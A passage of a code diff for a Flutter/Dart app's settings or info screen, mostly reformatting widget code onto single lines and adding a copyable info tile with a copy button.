         borderRadius: BorderRadius.circular(11.52),
         border: Border.all(
-          color: isDark
-              ? Colors.white.withOpacity(0.08)
-              : Colors.black.withOpacity(0.05),
+          color: isDark ? Colors.white.withOpacity(0.08) : Colors.black.withOpacity(0.05),
           width: 0.8,
         ),
         boxShadow: [
           BoxShadow(
-            color: isDark
-                ? Colors.black.withOpacity(0.2)
-                : Colors.black.withOpacity(0.05),
+            color: isDark ? Colors.black.withOpacity(0.2) : Colors.black.withOpacity(0.05),
             blurRadius: 16,
             offset: const Offset(0, 3),
           ),
@@ -897,11 +965,7 @@ class _SectionHeader extends StatelessWidget {
   final String title;
   final Color color;
 
-  const _SectionHeader({
-    required this.icon,
-    required this.title,
-    required this.color,
-  });
+  const _SectionHeader({required this.icon, required this.title, required this.color});
 
   @override
   Widget build(BuildContext context) {
@@ -910,22 +974,13 @@ class _SectionHeader extends StatelessWidget {
         Container(
           padding: const EdgeInsets.all(4.8),
           decoration: BoxDecoration(
-            gradient: LinearGradient(
-              colors: [color.withOpacity(0.2), color.withOpacity(0.1)],
-            ),
+            gradient: LinearGradient(colors: [color.withOpacity(0.2), color.withOpacity(0.1)]),
             borderRadius: BorderRadius.circular(5.12),
           ),
           child: Icon(icon, color: color, size: 12.8),
         ),
         const SizedBox(width: 10),
-        Text(
-          title,
-          style: const TextStyle(
-            fontSize: 11.2,
-            fontWeight: FontWeight.w700,
-            letterSpacing: -0.3,
-          ),
-        ),
+        Text(title, style: const TextStyle(fontSize: 11.2, fontWeight: FontWeight.w700, letterSpacing: -0.3)),
       ],
     );
   }
@@ -954,11 +1009,7 @@ class _InfoTile extends StatelessWidget {
       padding: const EdgeInsets.only(bottom: 10),
       child: Row(
         children: [
-          Icon(
-            icon,
-            size: 11.2,
-            color: isDark ? Colors.white54 : const Color(0xFF94A3B8),
-          ),
+          Icon(icon, size: 11.2, color: isDark ? Colors.white54 : const Color(0xFF94A3B8)),
           const SizedBox(width: 10),
           Expanded(
             child: Text(
@@ -976,12 +1027,91 @@ class _InfoTile extends StatelessWidget {
               style: TextStyle(
                 fontSize: 9.6,
                 fontWeight: FontWeight.w700,
-                color: valueColor ??
-                    (isDark ? Colors.white : const Color(0xFF1E293B)),
+                color: valueColor ?? (isDark ? Colors.white : const Color(0xFF1E293B)),
                 fontFamily: isMonospace ? 'monospace' : null,
               ),
               textAlign: TextAlign.end,
               overflow: TextOverflow.ellipsis,
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+}
+
+class _CopyableInfoTile extends StatelessWidget {
+  final IconData icon;
+  final String label;
+  final String value;
+  final bool isDark;
+  final bool isMonospace;
+  final int maxLines;
+  final VoidCallback onCopy;
+
+  const _CopyableInfoTile({
+    required this.icon,
+    required this.label,
+    required this.value,
+    required this.isDark,
+    required this.onCopy,
+    this.isMonospace = false,
+    this.maxLines = 1,
+  });
+
+  @override
+  Widget build(BuildContext context) {
+    return Padding(
+      padding: const EdgeInsets.only(bottom: 10),
+      child: Row(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Padding(
+            padding: const EdgeInsets.only(top: 2),
+            child: Icon(icon, size: 11.2, color: isDark ? Colors.white54 : const Color(0xFF94A3B8)),
+          ),
+          const SizedBox(width: 10),
+          Expanded(
+            child: Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Text(
+                  label,
+                  style: TextStyle(
+                    fontSize: 9.6,
+                    fontWeight: FontWeight.w500,
+                    color: isDark ? Colors.white70 : const Color(0xFF64748B),
+                  ),
+                ),
+                const SizedBox(height: 4),
+                Text(
+                  value,
+                  style: TextStyle(
+                    fontSize: 9.6,
+                    fontWeight: FontWeight.w700,
+                    color: isDark ? Colors.white : const Color(0xFF1E293B),
+                    fontFamily: isMonospace ? 'monospace' : null,
+                  ),
+                  maxLines: maxLines,
+                  overflow: TextOverflow.ellipsis,
+                ),
+              ],
+            ),
+          ),
+          const SizedBox(width: 8),
+          Material(
+            color: Colors.transparent,
+            child: InkWell(
+              onTap: onCopy,
+              borderRadius: BorderRadius.circular(6),
+              child: Container(
+                padding: const EdgeInsets.all(6),
+                decoration: BoxDecoration(
+                  color: const Color(0xFF6366F1).withOpacity(0.1),
+                  borderRadius: BorderRadius.circular(6),
+                ),
+                child: Icon(Icons.copy_rounded, size: 12, color: const Color(0xFF6366F1)),
+              ),
             ),
           ),
         ],
@@ -1007,11 +1137,7 @@ class _SettingTile extends StatelessWidget {
   Widget build(BuildContext context) {
     return Row(
       children: [
-        Icon(
-          icon,
-          size: 11.2,
-          color: isDark ? Colors.white54 : const Color(0xFF94A3B8),
-        ),
+        Icon(icon, size: 11.2, color: isDark ? Colors.white54 : const Color(0xFF94A3B8)),
         const SizedBox(width: 10),
         Expanded(
           child: Text(
@@ -1027,15 +1153,13 @@ class _SettingTile extends StatelessWidget {
           padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3.2),
           decoration: BoxDecoration(
             gradient: isEnabled
-                ? const LinearGradient(
-                    colors: [Color(0xFF10B981), Color(0xFF059669)],
-                  )
+                ? const LinearGradient(colors: [Color(0xFF10B981), Color(0xFF059669)])
                 : LinearGradient(
-                    colors: [
-                      (isDark ? Colors.white : Colors.black).withOpacity(0.1),
-                      (isDark ? Colors.white : Colors.black).withOpacity(0.05),
-                    ],
-                  ),
+              colors: [
+                (isDark ? Colors.white : Colors.black).withOpacity(0.1),
+                (isDark ? Colors.white : Colors.black).withOpacity(0.05),
+              ],
+            ),
             borderRadius: BorderRadius.circular(5.12),
           ),
           child: Text(
@@ -1043,9 +1167,7 @@ class _SettingTile extends StatelessWidget {
             style: TextStyle(
               fontSize: 8,
               fontWeight: FontWeight.w700,
-              color: isEnabled
-                  ? Colors.white
-                  : (isDark ? Colors.white54 : const Color(0xFF64748B)),
+              color: isEnabled ? Colors.white : (isDark ? Colors.white54 : const Color(0xFF64748B)),
             ),
           ),
         ),
